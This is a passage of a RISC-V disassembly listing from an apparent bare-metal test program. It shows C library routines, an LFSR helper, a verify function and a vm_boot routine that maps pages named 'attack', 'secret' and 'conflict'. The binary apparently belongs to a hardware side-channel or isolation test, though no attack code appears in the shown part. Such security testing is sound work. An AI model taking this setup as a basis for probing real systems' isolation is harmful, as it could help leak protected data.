    800080a0:	0007879b          	sext.w	a5,a5
    800080a4:	00078513          	mv	a0,a5
    800080a8:	0d813083          	ld	ra,216(sp)
    800080ac:	0d013403          	ld	s0,208(sp)
    800080b0:	11010113          	add	sp,sp,272
    800080b4:	00008067          	ret

00000000800080b8 <memcpy>:
    800080b8:	fb010113          	add	sp,sp,-80
    800080bc:	04813423          	sd	s0,72(sp)
    800080c0:	05010413          	add	s0,sp,80
    800080c4:	fca43423          	sd	a0,-56(s0)
    800080c8:	fcb43023          	sd	a1,-64(s0)
    800080cc:	fac43c23          	sd	a2,-72(s0)
    800080d0:	fc843703          	ld	a4,-56(s0)
    800080d4:	fc043783          	ld	a5,-64(s0)
    800080d8:	00f76733          	or	a4,a4,a5
    800080dc:	fb843783          	ld	a5,-72(s0)
    800080e0:	00f767b3          	or	a5,a4,a5
    800080e4:	0077f793          	and	a5,a5,7
    800080e8:	04079863          	bnez	a5,80008138 <memcpy+0x80>
    800080ec:	fc043783          	ld	a5,-64(s0)
    800080f0:	fef43423          	sd	a5,-24(s0)
    800080f4:	fc843783          	ld	a5,-56(s0)
    800080f8:	fef43023          	sd	a5,-32(s0)
    800080fc:	0240006f          	j	80008120 <memcpy+0x68>
    80008100:	fe843703          	ld	a4,-24(s0)
    80008104:	00870793          	add	a5,a4,8
    80008108:	fef43423          	sd	a5,-24(s0)
    8000810c:	fe043783          	ld	a5,-32(s0)
    80008110:	00878693          	add	a3,a5,8
    80008114:	fed43023          	sd	a3,-32(s0)
    80008118:	00073703          	ld	a4,0(a4)
    8000811c:	00e7b023          	sd	a4,0(a5)
    80008120:	fc843703          	ld	a4,-56(s0)
    80008124:	fb843783          	ld	a5,-72(s0)
    80008128:	00f707b3          	add	a5,a4,a5
    8000812c:	fe043703          	ld	a4,-32(s0)
    80008130:	fcf768e3          	bltu	a4,a5,80008100 <memcpy+0x48>
    80008134:	04c0006f          	j	80008180 <memcpy+0xc8>
    80008138:	fc043783          	ld	a5,-64(s0)
    8000813c:	fcf43c23          	sd	a5,-40(s0)
    80008140:	fc843783          	ld	a5,-56(s0)
    80008144:	fcf43823          	sd	a5,-48(s0)
    80008148:	0240006f          	j	8000816c <memcpy+0xb4>
    8000814c:	fd843703          	ld	a4,-40(s0)
    80008150:	00170793          	add	a5,a4,1
    80008154:	fcf43c23          	sd	a5,-40(s0)
    80008158:	fd043783          	ld	a5,-48(s0)
    8000815c:	00178693          	add	a3,a5,1
    80008160:	fcd43823          	sd	a3,-48(s0)
    80008164:	00074703          	lbu	a4,0(a4)
    80008168:	00e78023          	sb	a4,0(a5)
    8000816c:	fc843703          	ld	a4,-56(s0)
    80008170:	fb843783          	ld	a5,-72(s0)
    80008174:	00f707b3          	add	a5,a4,a5
    80008178:	fd043703          	ld	a4,-48(s0)
    8000817c:	fcf768e3          	bltu	a4,a5,8000814c <memcpy+0x94>
    80008180:	fc843783          	ld	a5,-56(s0)
    80008184:	00078513          	mv	a0,a5
    80008188:	04813403          	ld	s0,72(sp)
    8000818c:	05010113          	add	sp,sp,80
    80008190:	00008067          	ret

0000000080008194 <memset>:
    80008194:	fb010113          	add	sp,sp,-80
    80008198:	04813423          	sd	s0,72(sp)
    8000819c:	05010413          	add	s0,sp,80
    800081a0:	fca43423          	sd	a0,-56(s0)
    800081a4:	00058793          	mv	a5,a1
    800081a8:	fac43c23          	sd	a2,-72(s0)
    800081ac:	fcf42223          	sw	a5,-60(s0)
    800081b0:	fc843703          	ld	a4,-56(s0)
    800081b4:	fb843783          	ld	a5,-72(s0)
    800081b8:	00f767b3          	or	a5,a4,a5
    800081bc:	0077f793          	and	a5,a5,7
    800081c0:	08079263          	bnez	a5,80008244 <memset+0xb0>
    800081c4:	fc442783          	lw	a5,-60(s0)
    800081c8:	0ff7f793          	zext.b	a5,a5
    800081cc:	fcf43c23          	sd	a5,-40(s0)
    800081d0:	fd843783          	ld	a5,-40(s0)
    800081d4:	00879793          	sll	a5,a5,0x8
    800081d8:	fd843703          	ld	a4,-40(s0)
    800081dc:	00f767b3          	or	a5,a4,a5
    800081e0:	fcf43c23          	sd	a5,-40(s0)
    800081e4:	fd843783          	ld	a5,-40(s0)
    800081e8:	01079793          	sll	a5,a5,0x10
    800081ec:	fd843703          	ld	a4,-40(s0)
    800081f0:	00f767b3          	or	a5,a4,a5
    800081f4:	fcf43c23          	sd	a5,-40(s0)
    800081f8:	fd843783          	ld	a5,-40(s0)
    800081fc:	02079793          	sll	a5,a5,0x20
    80008200:	fd843703          	ld	a4,-40(s0)
    80008204:	00f767b3          	or	a5,a4,a5
    80008208:	fcf43c23          	sd	a5,-40(s0)
    8000820c:	fc843783          	ld	a5,-56(s0)
    80008210:	fef43423          	sd	a5,-24(s0)
    80008214:	0180006f          	j	8000822c <memset+0x98>
    80008218:	fe843783          	ld	a5,-24(s0)
    8000821c:	00878713          	add	a4,a5,8
    80008220:	fee43423          	sd	a4,-24(s0)
    80008224:	fd843703          	ld	a4,-40(s0)
    80008228:	00e7b023          	sd	a4,0(a5)
    8000822c:	fc843703          	ld	a4,-56(s0)
    80008230:	fb843783          	ld	a5,-72(s0)
    80008234:	00f707b3          	add	a5,a4,a5
    80008238:	fe843703          	ld	a4,-24(s0)
    8000823c:	fcf76ee3          	bltu	a4,a5,80008218 <memset+0x84>
    80008240:	03c0006f          	j	8000827c <memset+0xe8>
    80008244:	fc843783          	ld	a5,-56(s0)
    80008248:	fef43023          	sd	a5,-32(s0)
    8000824c:	01c0006f          	j	80008268 <memset+0xd4>
    80008250:	fe043783          	ld	a5,-32(s0)
    80008254:	00178713          	add	a4,a5,1
    80008258:	fee43023          	sd	a4,-32(s0)
    8000825c:	fc442703          	lw	a4,-60(s0)
    80008260:	0ff77713          	zext.b	a4,a4
    80008264:	00e78023          	sb	a4,0(a5)
    80008268:	fc843703          	ld	a4,-56(s0)
    8000826c:	fb843783          	ld	a5,-72(s0)
    80008270:	00f707b3          	add	a5,a4,a5
    80008274:	fe043703          	ld	a4,-32(s0)
    80008278:	fcf76ce3          	bltu	a4,a5,80008250 <memset+0xbc>
    8000827c:	fc843783          	ld	a5,-56(s0)
    80008280:	00078513          	mv	a0,a5
    80008284:	04813403          	ld	s0,72(sp)
    80008288:	05010113          	add	sp,sp,80
    8000828c:	00008067          	ret

0000000080008290 <strlen>:
    80008290:	fd010113          	add	sp,sp,-48
    80008294:	02813423          	sd	s0,40(sp)
    80008298:	03010413          	add	s0,sp,48
    8000829c:	fca43c23          	sd	a0,-40(s0)
    800082a0:	fd843783          	ld	a5,-40(s0)
    800082a4:	fef43423          	sd	a5,-24(s0)
    800082a8:	0100006f          	j	800082b8 <strlen+0x28>
    800082ac:	fe843783          	ld	a5,-24(s0)
    800082b0:	00178793          	add	a5,a5,1
    800082b4:	fef43423          	sd	a5,-24(s0)
    800082b8:	fe843783          	ld	a5,-24(s0)
    800082bc:	0007c783          	lbu	a5,0(a5)
    800082c0:	fe0796e3          	bnez	a5,800082ac <strlen+0x1c>
    800082c4:	fe843703          	ld	a4,-24(s0)
    800082c8:	fd843783          	ld	a5,-40(s0)
    800082cc:	40f707b3          	sub	a5,a4,a5
    800082d0:	00078513          	mv	a0,a5
    800082d4:	02813403          	ld	s0,40(sp)
    800082d8:	03010113          	add	sp,sp,48
    800082dc:	00008067          	ret

00000000800082e0 <strnlen>:
    800082e0:	fd010113          	add	sp,sp,-48
    800082e4:	02813423          	sd	s0,40(sp)
    800082e8:	03010413          	add	s0,sp,48
    800082ec:	fca43c23          	sd	a0,-40(s0)
    800082f0:	fcb43823          	sd	a1,-48(s0)
    800082f4:	fd843783          	ld	a5,-40(s0)
    800082f8:	fef43423          	sd	a5,-24(s0)
    800082fc:	0100006f          	j	8000830c <strnlen+0x2c>
    80008300:	fe843783          	ld	a5,-24(s0)
    80008304:	00178793          	add	a5,a5,1
    80008308:	fef43423          	sd	a5,-24(s0)
    8000830c:	fd043783          	ld	a5,-48(s0)
    80008310:	fff78713          	add	a4,a5,-1
    80008314:	fce43823          	sd	a4,-48(s0)
    80008318:	00078863          	beqz	a5,80008328 <strnlen+0x48>
    8000831c:	fe843783          	ld	a5,-24(s0)
    80008320:	0007c783          	lbu	a5,0(a5)
    80008324:	fc079ee3          	bnez	a5,80008300 <strnlen+0x20>
    80008328:	fe843703          	ld	a4,-24(s0)
    8000832c:	fd843783          	ld	a5,-40(s0)
    80008330:	40f707b3          	sub	a5,a4,a5
    80008334:	00078513          	mv	a0,a5
    80008338:	02813403          	ld	s0,40(sp)
    8000833c:	03010113          	add	sp,sp,48
    80008340:	00008067          	ret

0000000080008344 <strcmp>:
    80008344:	fd010113          	add	sp,sp,-48
    80008348:	02813423          	sd	s0,40(sp)
    8000834c:	03010413          	add	s0,sp,48
    80008350:	fca43c23          	sd	a0,-40(s0)
    80008354:	fcb43823          	sd	a1,-48(s0)
    80008358:	fd843783          	ld	a5,-40(s0)
    8000835c:	00178713          	add	a4,a5,1
    80008360:	fce43c23          	sd	a4,-40(s0)
    80008364:	0007c783          	lbu	a5,0(a5)
    80008368:	fef407a3          	sb	a5,-17(s0)
    8000836c:	fd043783          	ld	a5,-48(s0)
    80008370:	00178713          	add	a4,a5,1
    80008374:	fce43823          	sd	a4,-48(s0)
    80008378:	0007c783          	lbu	a5,0(a5)
    8000837c:	fef40723          	sb	a5,-18(s0)
    80008380:	fef44783          	lbu	a5,-17(s0)
    80008384:	0ff7f793          	zext.b	a5,a5
    80008388:	00078e63          	beqz	a5,800083a4 <strcmp+0x60>
    8000838c:	fef44783          	lbu	a5,-17(s0)
    80008390:	00078713          	mv	a4,a5
    80008394:	fee44783          	lbu	a5,-18(s0)
    80008398:	0ff77713          	zext.b	a4,a4
    8000839c:	0ff7f793          	zext.b	a5,a5
    800083a0:	faf70ce3          	beq	a4,a5,80008358 <strcmp+0x14>
    800083a4:	fef44783          	lbu	a5,-17(s0)
    800083a8:	0007871b          	sext.w	a4,a5
    800083ac:	fee44783          	lbu	a5,-18(s0)
    800083b0:	0007879b          	sext.w	a5,a5
    800083b4:	40f707bb          	subw	a5,a4,a5
    800083b8:	0007879b          	sext.w	a5,a5
    800083bc:	00078513          	mv	a0,a5
    800083c0:	02813403          	ld	s0,40(sp)
    800083c4:	03010113          	add	sp,sp,48
    800083c8:	00008067          	ret

00000000800083cc <strcpy>:
    800083cc:	fd010113          	add	sp,sp,-48
    800083d0:	02813423          	sd	s0,40(sp)
    800083d4:	03010413          	add	s0,sp,48
    800083d8:	fca43c23          	sd	a0,-40(s0)
    800083dc:	fcb43823          	sd	a1,-48(s0)
    800083e0:	fd843783          	ld	a5,-40(s0)
    800083e4:	fef43423          	sd	a5,-24(s0)
    800083e8:	00000013          	nop
    800083ec:	fd043703          	ld	a4,-48(s0)
    800083f0:	00170793          	add	a5,a4,1
    800083f4:	fcf43823          	sd	a5,-48(s0)
    800083f8:	fe843783          	ld	a5,-24(s0)
    800083fc:	00178693          	add	a3,a5,1
    80008400:	fed43423          	sd	a3,-24(s0)
    80008404:	00074703          	lbu	a4,0(a4)
    80008408:	00e78023          	sb	a4,0(a5)
    8000840c:	0007c783          	lbu	a5,0(a5)
    80008410:	fc079ee3          	bnez	a5,800083ec <strcpy+0x20>
    80008414:	fd843783          	ld	a5,-40(s0)
    80008418:	00078513          	mv	a0,a5
    8000841c:	02813403          	ld	s0,40(sp)
    80008420:	03010113          	add	sp,sp,48
    80008424:	00008067          	ret

0000000080008428 <atol>:
    80008428:	fd010113          	add	sp,sp,-48
    8000842c:	02813423          	sd	s0,40(sp)
    80008430:	03010413          	add	s0,sp,48
    80008434:	fca43c23          	sd	a0,-40(s0)
    80008438:	fe043423          	sd	zero,-24(s0)
    8000843c:	fe042223          	sw	zero,-28(s0)
    80008440:	0100006f          	j	80008450 <atol+0x28>
    80008444:	fd843783          	ld	a5,-40(s0)
    80008448:	00178793          	add	a5,a5,1
    8000844c:	fcf43c23          	sd	a5,-40(s0)
    80008450:	fd843783          	ld	a5,-40(s0)
    80008454:	0007c783          	lbu	a5,0(a5)
    80008458:	00078713          	mv	a4,a5
    8000845c:	02000793          	li	a5,32
    80008460:	fef702e3          	beq	a4,a5,80008444 <atol+0x1c>
    80008464:	fd843783          	ld	a5,-40(s0)
    80008468:	0007c783          	lbu	a5,0(a5)
    8000846c:	00078713          	mv	a4,a5
    80008470:	02d00793          	li	a5,45
    80008474:	00f70c63          	beq	a4,a5,8000848c <atol+0x64>
    80008478:	fd843783          	ld	a5,-40(s0)
    8000847c:	0007c783          	lbu	a5,0(a5)
    80008480:	00078713          	mv	a4,a5
    80008484:	02b00793          	li	a5,43
    80008488:	06f71c63          	bne	a4,a5,80008500 <atol+0xd8>
    8000848c:	fd843783          	ld	a5,-40(s0)
    80008490:	0007c783          	lbu	a5,0(a5)
    80008494:	0007871b          	sext.w	a4,a5
    80008498:	02d00793          	li	a5,45
    8000849c:	40f707b3          	sub	a5,a4,a5
    800084a0:	0017b793          	seqz	a5,a5
    800084a4:	0ff7f793          	zext.b	a5,a5
    800084a8:	fef42223          	sw	a5,-28(s0)
    800084ac:	fd843783          	ld	a5,-40(s0)
    800084b0:	00178793          	add	a5,a5,1
    800084b4:	fcf43c23          	sd	a5,-40(s0)
    800084b8:	0480006f          	j	80008500 <atol+0xd8>
    800084bc:	fe843703          	ld	a4,-24(s0)
    800084c0:	00070793          	mv	a5,a4
    800084c4:	00279793          	sll	a5,a5,0x2
    800084c8:	00e787b3          	add	a5,a5,a4
    800084cc:	00179793          	sll	a5,a5,0x1
    800084d0:	fef43423          	sd	a5,-24(s0)
    800084d4:	fd843783          	ld	a5,-40(s0)
    800084d8:	00178713          	add	a4,a5,1
    800084dc:	fce43c23          	sd	a4,-40(s0)
    800084e0:	0007c783          	lbu	a5,0(a5)
    800084e4:	0007879b          	sext.w	a5,a5
    800084e8:	fd07879b          	addw	a5,a5,-48
    800084ec:	0007879b          	sext.w	a5,a5
    800084f0:	00078713          	mv	a4,a5
    800084f4:	fe843783          	ld	a5,-24(s0)
    800084f8:	00e787b3          	add	a5,a5,a4
    800084fc:	fef43423          	sd	a5,-24(s0)
    80008500:	fd843783          	ld	a5,-40(s0)
    80008504:	0007c783          	lbu	a5,0(a5)
    80008508:	fa079ae3          	bnez	a5,800084bc <atol+0x94>
    8000850c:	fe442783          	lw	a5,-28(s0)
    80008510:	0007879b          	sext.w	a5,a5
    80008514:	00078863          	beqz	a5,80008524 <atol+0xfc>
    80008518:	fe843783          	ld	a5,-24(s0)
    8000851c:	40f007b3          	neg	a5,a5
    80008520:	0080006f          	j	80008528 <atol+0x100>
    80008524:	fe843783          	ld	a5,-24(s0)
    80008528:	00078513          	mv	a0,a5
    8000852c:	02813403          	ld	s0,40(sp)
    80008530:	03010113          	add	sp,sp,48
    80008534:	00008067          	ret

0000000080008538 <lfsr63>:
    80008538:	fd010113          	add	sp,sp,-48
    8000853c:	02813423          	sd	s0,40(sp)
    80008540:	03010413          	add	s0,sp,48
    80008544:	fca43c23          	sd	a0,-40(s0)
    80008548:	fd843783          	ld	a5,-40(s0)
    8000854c:	0017d713          	srl	a4,a5,0x1
    80008550:	fd843783          	ld	a5,-40(s0)
    80008554:	00f747b3          	xor	a5,a4,a5
    80008558:	0017f793          	and	a5,a5,1
    8000855c:	fef43423          	sd	a5,-24(s0)
    80008560:	fd843783          	ld	a5,-40(s0)
    80008564:	0017d713          	srl	a4,a5,0x1
    80008568:	fe843783          	ld	a5,-24(s0)
    8000856c:	03e79793          	sll	a5,a5,0x3e
    80008570:	00f767b3          	or	a5,a4,a5
    80008574:	00078513          	mv	a0,a5
    80008578:	02813403          	ld	s0,40(sp)
    8000857c:	03010113          	add	sp,sp,48
    80008580:	00008067          	ret

0000000080008584 <vm_boot>:
    80008584:	fe010113          	add	sp,sp,-32
    80008588:	00813c23          	sd	s0,24(sp)
    8000858c:	02010413          	add	s0,sp,32
    80008590:	ffffb797          	auipc	a5,0xffffb
    80008594:	a7078793          	add	a5,a5,-1424 # 80003000 <pt+0x1000>
    80008598:	00c7d793          	srl	a5,a5,0xc
    8000859c:	00a79793          	sll	a5,a5,0xa
    800085a0:	0017e713          	or	a4,a5,1
    800085a4:	ffffa797          	auipc	a5,0xffffa
    800085a8:	a5c78793          	add	a5,a5,-1444 # 80002000 <pt>
    800085ac:	00e7b823          	sd	a4,16(a5)
    800085b0:	ffffa717          	auipc	a4,0xffffa
    800085b4:	a5070713          	add	a4,a4,-1456 # 80002000 <pt>
    800085b8:	000017b7          	lui	a5,0x1
    800085bc:	00f707b3          	add	a5,a4,a5
    800085c0:	20000737          	lui	a4,0x20000
    800085c4:	0cf70713          	add	a4,a4,207 # 200000cf <threadsense.2+0x2000004b>
    800085c8:	00e7b023          	sd	a4,0(a5) # 1000 <threadsense.2+0xf7c>
    800085cc:	001f8797          	auipc	a5,0x1f8
    800085d0:	a3478793          	add	a5,a5,-1484 # 80200000 <attack>
    800085d4:	00c7d793          	srl	a5,a5,0xc
    800085d8:	00a79713          	sll	a4,a5,0xa
    800085dc:	001f8797          	auipc	a5,0x1f8
    800085e0:	a2478793          	add	a5,a5,-1500 # 80200000 <attack>
    800085e4:	0157d793          	srl	a5,a5,0x15
    800085e8:	1ff7f793          	and	a5,a5,511
    800085ec:	0cb76713          	or	a4,a4,203
    800085f0:	ffffa697          	auipc	a3,0xffffa
    800085f4:	a1068693          	add	a3,a3,-1520 # 80002000 <pt>
    800085f8:	20078793          	add	a5,a5,512
    800085fc:	00379793          	sll	a5,a5,0x3
    80008600:	00f687b3          	add	a5,a3,a5
    80008604:	00e7b023          	sd	a4,0(a5)
    80008608:	ffffc797          	auipc	a5,0xffffc
    8000860c:	9f878793          	add	a5,a5,-1544 # 80004000 <pt+0x2000>
    80008610:	00c7d793          	srl	a5,a5,0xc
    80008614:	00a79713          	sll	a4,a5,0xa
    80008618:	003f8797          	auipc	a5,0x3f8
    8000861c:	9e878793          	add	a5,a5,-1560 # 80400000 <data>
    80008620:	0157d793          	srl	a5,a5,0x15
    80008624:	1ff7f793          	and	a5,a5,511
    80008628:	00176713          	or	a4,a4,1
    8000862c:	ffffa697          	auipc	a3,0xffffa
    80008630:	9d468693          	add	a3,a3,-1580 # 80002000 <pt>
    80008634:	20078793          	add	a5,a5,512
    80008638:	00379793          	sll	a5,a5,0x3
    8000863c:	00f687b3          	add	a5,a3,a5
    80008640:	00e7b023          	sd	a4,0(a5)
    80008644:	005f8797          	auipc	a5,0x5f8
    80008648:	9bc78793          	add	a5,a5,-1604 # 80600000 <conflict>
    8000864c:	00c7d793          	srl	a5,a5,0xc
    80008650:	00a79713          	sll	a4,a5,0xa
    80008654:	005f8797          	auipc	a5,0x5f8
    80008658:	9ac78793          	add	a5,a5,-1620 # 80600000 <conflict>
    8000865c:	0157d793          	srl	a5,a5,0x15
    80008660:	1ff7f793          	and	a5,a5,511
    80008664:	0c776713          	or	a4,a4,199
    80008668:	ffffa697          	auipc	a3,0xffffa
    8000866c:	99868693          	add	a3,a3,-1640 # 80002000 <pt>
    80008670:	20078793          	add	a5,a5,512
    80008674:	00379793          	sll	a5,a5,0x3
    80008678:	00f687b3          	add	a5,a3,a5
    8000867c:	00e7b023          	sd	a4,0(a5)
    80008680:	ffffd797          	auipc	a5,0xffffd
    80008684:	98078793          	add	a5,a5,-1664 # 80005000 <pt+0x3000>
    80008688:	00c7d793          	srl	a5,a5,0xc
    8000868c:	00a79713          	sll	a4,a5,0xa
    80008690:	007f8797          	auipc	a5,0x7f8
    80008694:	97078793          	add	a5,a5,-1680 # 80800000 <secret>
    80008698:	0157d793          	srl	a5,a5,0x15
    8000869c:	1ff7f793          	and	a5,a5,511
    800086a0:	00176713          	or	a4,a4,1
    800086a4:	ffffa697          	auipc	a3,0xffffa
    800086a8:	95c68693          	add	a3,a3,-1700 # 80002000 <pt>
    800086ac:	20078793          	add	a5,a5,512
    800086b0:	00379793          	sll	a5,a5,0x3
    800086b4:	00f687b3          	add	a5,a3,a5
    800086b8:	00e7b023          	sd	a4,0(a5)
    800086bc:	007f8797          	auipc	a5,0x7f8
    800086c0:	94478793          	add	a5,a5,-1724 # 80800000 <secret>
    800086c4:	00c7d793          	srl	a5,a5,0xc
    800086c8:	00a79793          	sll	a5,a5,0xa
    800086cc:	0c77e713          	or	a4,a5,199
    800086d0:	ffffa697          	auipc	a3,0xffffa
    800086d4:	93068693          	add	a3,a3,-1744 # 80002000 <pt>
    800086d8:	000037b7          	lui	a5,0x3
    800086dc:	00f687b3          	add	a5,a3,a5
    800086e0:	00e7b023          	sd	a4,0(a5) # 3000 <threadsense.2+0x2f7c>
    800086e4:	003f8797          	auipc	a5,0x3f8
    800086e8:	91c78793          	add	a5,a5,-1764 # 80400000 <data>
    800086ec:	00c7d793          	srl	a5,a5,0xc
    800086f0:	00a79713          	sll	a4,a5,0xa
    800086f4:	003f8797          	auipc	a5,0x3f8
    800086f8:	90c78793          	add	a5,a5,-1780 # 80400000 <data>
    800086fc:	00c7d793          	srl	a5,a5,0xc
    80008700:	1ff7f793          	and	a5,a5,511
    80008704:	0c776713          	or	a4,a4,199
    80008708:	ffffa697          	auipc	a3,0xffffa
    8000870c:	8f868693          	add	a3,a3,-1800 # 80002000 <pt>
    80008710:	40078793          	add	a5,a5,1024
    80008714:	00379793          	sll	a5,a5,0x3
    80008718:	00f687b3          	add	a5,a3,a5
    8000871c:	00e7b023          	sd	a4,0(a5)
    80008720:	003f9797          	auipc	a5,0x3f9
    80008724:	8e078793          	add	a5,a5,-1824 # 80401000 <data1>
    80008728:	00c7d793          	srl	a5,a5,0xc
    8000872c:	00a79713          	sll	a4,a5,0xa
    80008730:	003f9797          	auipc	a5,0x3f9
    80008734:	8d078793          	add	a5,a5,-1840 # 80401000 <data1>
    80008738:	00c7d793          	srl	a5,a5,0xc
    8000873c:	1ff7f793          	and	a5,a5,511
    80008740:	0c776713          	or	a4,a4,199
    80008744:	ffffa697          	auipc	a3,0xffffa
    80008748:	8bc68693          	add	a3,a3,-1860 # 80002000 <pt>
    8000874c:	40078793          	add	a5,a5,1024
    80008750:	00379793          	sll	a5,a5,0x3
    80008754:	00f687b3          	add	a5,a3,a5
    80008758:	00e7b023          	sd	a4,0(a5)
    8000875c:	003fa797          	auipc	a5,0x3fa
    80008760:	8a478793          	add	a5,a5,-1884 # 80402000 <data2>
    80008764:	00c7d793          	srl	a5,a5,0xc
    80008768:	00a79713          	sll	a4,a5,0xa
    8000876c:	003fa797          	auipc	a5,0x3fa
    80008770:	89478793          	add	a5,a5,-1900 # 80402000 <data2>
    80008774:	00c7d793          	srl	a5,a5,0xc
    80008778:	1ff7f793          	and	a5,a5,511
    8000877c:	00176713          	or	a4,a4,1
    80008780:	ffffa697          	auipc	a3,0xffffa
    80008784:	88068693          	add	a3,a3,-1920 # 80002000 <pt>
    80008788:	40078793          	add	a5,a5,1024
    8000878c:	00379793          	sll	a5,a5,0x3
    80008790:	00f687b3          	add	a5,a3,a5
    80008794:	00e7b023          	sd	a4,0(a5)
    80008798:	00800793          	li	a5,8
    8000879c:	fef43423          	sd	a5,-24(s0)
    800087a0:	fe843783          	ld	a5,-24(s0)
    800087a4:	03c79713          	sll	a4,a5,0x3c
    800087a8:	ffffa797          	auipc	a5,0xffffa
    800087ac:	85878793          	add	a5,a5,-1960 # 80002000 <pt>
    800087b0:	00c7d793          	srl	a5,a5,0xc
    800087b4:	00f767b3          	or	a5,a4,a5
    800087b8:	fef43023          	sd	a5,-32(s0)
    800087bc:	fe043783          	ld	a5,-32(s0)
    800087c0:	18079073          	csrw	satp,a5
    800087c4:	0000b7b7          	lui	a5,0xb
    800087c8:	1557879b          	addw	a5,a5,341 # b155 <threadsense.2+0xb0d1>
    800087cc:	30279073          	csrw	medeleg,a5
    800087d0:	12000073          	sfence.vma
    800087d4:	00000013          	nop
    800087d8:	01813403          	ld	s0,24(sp)
    800087dc:	02010113          	add	sp,sp,32
    800087e0:	00008067          	ret

00000000800087e4 <printArray>:
    800087e4:	fd010113          	add	sp,sp,-48
    800087e8:	02813423          	sd	s0,40(sp)
    800087ec:	03010413          	add	s0,sp,48
    800087f0:	fea43423          	sd	a0,-24(s0)
    800087f4:	00058793          	mv	a5,a1
    800087f8:	fcc43c23          	sd	a2,-40(s0)
    800087fc:	fef42223          	sw	a5,-28(s0)
    80008800:	00000013          	nop
    80008804:	02813403          	ld	s0,40(sp)
    80008808:	03010113          	add	sp,sp,48
    8000880c:	00008067          	ret

0000000080008810 <printDoubleArray>:
    80008810:	fd010113          	add	sp,sp,-48
    80008814:	02813423          	sd	s0,40(sp)
    80008818:	03010413          	add	s0,sp,48
    8000881c:	fea43423          	sd	a0,-24(s0)
    80008820:	00058793          	mv	a5,a1
    80008824:	fcc43c23          	sd	a2,-40(s0)
    80008828:	fef42223          	sw	a5,-28(s0)
    8000882c:	00000013          	nop
    80008830:	02813403          	ld	s0,40(sp)
    80008834:	03010113          	add	sp,sp,48
    80008838:	00008067          	ret

000000008000883c <verify>:
    8000883c:	fb010113          	add	sp,sp,-80
    80008840:	04813423          	sd	s0,72(sp)
    80008844:	05010413          	add	s0,sp,80
    80008848:	00050793          	mv	a5,a0
    8000884c:	fcb43023          	sd	a1,-64(s0)
    80008850:	fac43c23          	sd	a2,-72(s0)
    80008854:	fcf42623          	sw	a5,-52(s0)
    80008858:	fe042623          	sw	zero,-20(s0)
    8000885c:	0c80006f          	j	80008924 <verify+0xe8>
    80008860:	fec42783          	lw	a5,-20(s0)
    80008864:	00279793          	sll	a5,a5,0x2
    80008868:	fc043703          	ld	a4,-64(s0)
    8000886c:	00f707b3          	add	a5,a4,a5
    80008870:	0007a783          	lw	a5,0(a5)
    80008874:	fef42423          	sw	a5,-24(s0)
    80008878:	fec42783          	lw	a5,-20(s0)
    8000887c:	00178793          	add	a5,a5,1
    80008880:	00279793          	sll	a5,a5,0x2
    80008884:	fc043703          	ld	a4,-64(s0)
    80008888:	00f707b3          	add	a5,a4,a5
    8000888c:	0007a783          	lw	a5,0(a5)
    80008890:	fef42223          	sw	a5,-28(s0)
    80008894:	fec42783          	lw	a5,-20(s0)
    80008898:	00279793          	sll	a5,a5,0x2
    8000889c:	fb843703          	ld	a4,-72(s0)
    800088a0:	00f707b3          	add	a5,a4,a5
    800088a4:	0007a783          	lw	a5,0(a5)
    800088a8:	fef42023          	sw	a5,-32(s0)
    800088ac:	fec42783          	lw	a5,-20(s0)
    800088b0:	00178793          	add	a5,a5,1
    800088b4:	00279793          	sll	a5,a5,0x2
    800088b8:	fb843703          	ld	a4,-72(s0)
    800088bc:	00f707b3          	add	a5,a4,a5
    800088c0:	0007a783          	lw	a5,0(a5)
    800088c4:	fcf42e23          	sw	a5,-36(s0)
    800088c8:	fe842783          	lw	a5,-24(s0)
    800088cc:	00078713          	mv	a4,a5
    800088d0:	fe042783          	lw	a5,-32(s0)
    800088d4:	0007071b          	sext.w	a4,a4
    800088d8:	0007879b          	sext.w	a5,a5
    800088dc:	00f70a63          	beq	a4,a5,800088f0 <verify+0xb4>
    800088e0:	fec42783          	lw	a5,-20(s0)
    800088e4:	0017879b          	addw	a5,a5,1
    800088e8:	0007879b          	sext.w	a5,a5
    800088ec:	0b80006f          	j	800089a4 <verify+0x168>
    800088f0:	fe442783          	lw	a5,-28(s0)
    800088f4:	00078713          	mv	a4,a5
    800088f8:	fdc42783          	lw	a5,-36(s0)
    800088fc:	0007071b          	sext.w	a4,a4
    80008900:	0007879b          	sext.w	a5,a5
    80008904:	00f70a63          	beq	a4,a5,80008918 <verify+0xdc>
    80008908:	fec42783          	lw	a5,-20(s0)
    8000890c:	0027879b          	addw	a5,a5,2
    80008910:	0007879b          	sext.w	a5,a5
    80008914:	0900006f          	j	800089a4 <verify+0x168>
    80008918:	fec42783          	lw	a5,-20(s0)
    8000891c:	0027879b          	addw	a5,a5,2
    80008920:	fef42623          	sw	a5,-20(s0)
    80008924:	fcc42783          	lw	a5,-52(s0)
    80008928:	01f7d71b          	srlw	a4,a5,0x1f
    8000892c:	00f707bb          	addw	a5,a4,a5
    80008930:	4017d79b          	sraw	a5,a5,0x1
    80008934:	0007879b          	sext.w	a5,a5
    80008938:	0017979b          	sllw	a5,a5,0x1
    8000893c:	0007871b          	sext.w	a4,a5
    80008940:	fec42783          	lw	a5,-20(s0)
    80008944:	0007879b          	sext.w	a5,a5
    80008948:	f0e7cce3          	blt	a5,a4,80008860 <verify+0x24>
    8000894c:	fcc42783          	lw	a5,-52(s0)
    80008950:	0017f793          	and	a5,a5,1
    80008954:	0007879b          	sext.w	a5,a5
    80008958:	04078463          	beqz	a5,800089a0 <verify+0x164>
    8000895c:	fcc42783          	lw	a5,-52(s0)
    80008960:	00279793          	sll	a5,a5,0x2
    80008964:	ffc78793          	add	a5,a5,-4
    80008968:	fc043703          	ld	a4,-64(s0)
    8000896c:	00f707b3          	add	a5,a4,a5
    80008970:	0007a783          	lw	a5,0(a5)
    80008974:	0007869b          	sext.w	a3,a5
    80008978:	fcc42783          	lw	a5,-52(s0)
    8000897c:	00279793          	sll	a5,a5,0x2
    80008980:	ffc78793          	add	a5,a5,-4
    80008984:	fb843703          	ld	a4,-72(s0)
    80008988:	00f707b3          	add	a5,a4,a5
    8000898c:	0007a783          	lw	a5,0(a5)
    80008990:	00068713          	mv	a4,a3
    80008994:	00f70663          	beq	a4,a5,800089a0 <verify+0x164>
    80008998:	fcc42783          	lw	a5,-52(s0)
    8000899c:	0080006f          	j	800089a4 <verify+0x168>
    800089a0:	00000793          	li	a5,0
    800089a4:	00078513          	mv	a0,a5
    800089a8:	04813403          	ld	s0,72(sp)
    800089ac:	05010113          	add	sp,sp,80
    800089b0:	00008067          	ret

00000000800089b4 <verifyDouble>:
    800089b4:	fa010113          	add	sp,sp,-96
